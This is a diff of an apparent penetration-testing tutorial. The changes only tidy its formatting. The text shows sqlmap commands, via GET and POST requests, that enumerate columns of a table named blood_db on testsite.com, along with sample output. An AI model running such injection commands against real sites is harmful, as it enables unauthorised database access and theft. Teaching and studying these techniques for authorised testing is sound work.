@@ -362,9 +362,6 @@ Database: blood
 +----------+
 ```
 
-  
-  
-
 Once we have available tables, now let’s gather the columns from the table blood_db.  
   
 **Using GET based Method**
@@ -372,16 +369,14 @@ Once we have available tables, now let’s gather the columns from the table bl
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`
 
 **`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
-**  
   
 **Using POST based Method**
 
 `sqlmap -r req.txt -D blood -T blood_db --columns`
 
 **`sqlmap -r req.txt -D <database_name> -T <table_name> --columns`  
-**
 
-Getting Tables
+Getting Tables:
 
 ```shell-session
 nare@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
@@ -413,7 +408,6 @@ Database: blood
 | users    |
 +----------+
 ```
-
   
 Or we can simply dump all the available databases and tables using the following commands.
 
